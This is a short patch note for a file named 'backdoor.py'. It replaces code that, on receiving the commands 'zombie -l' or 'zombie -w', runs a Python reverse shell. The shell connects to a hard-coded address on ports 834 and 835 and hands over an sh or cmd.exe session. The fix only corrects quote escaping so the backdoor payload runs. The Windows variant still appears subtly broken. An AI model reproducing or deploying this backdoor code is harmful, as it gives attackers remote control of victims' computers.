REPLACE THIS:

        if MALWARE_RECV == "zombie -l":
           os.system('python -c "import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(('192.168.1.26', 834)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); import pty; pty.spawn(\'sh\')"')
           
        if MALWARE_RECV == "zombie -w":
           os.system("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.1.26', 835)));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn('cmd.exe')'")







BY THIS:

        if MALWARE_RECV == "zombie -l":
           os.system('python -c "import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\'192.168.1.26\', 834)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); import pty; pty.spawn(\'sh\')"')
           
        if MALWARE_RECV == "zombie -w":
           os.system("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'192.168.1.26\', 835)));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\'cmd.exe\')'")




IN THE 'backdoor.py'.
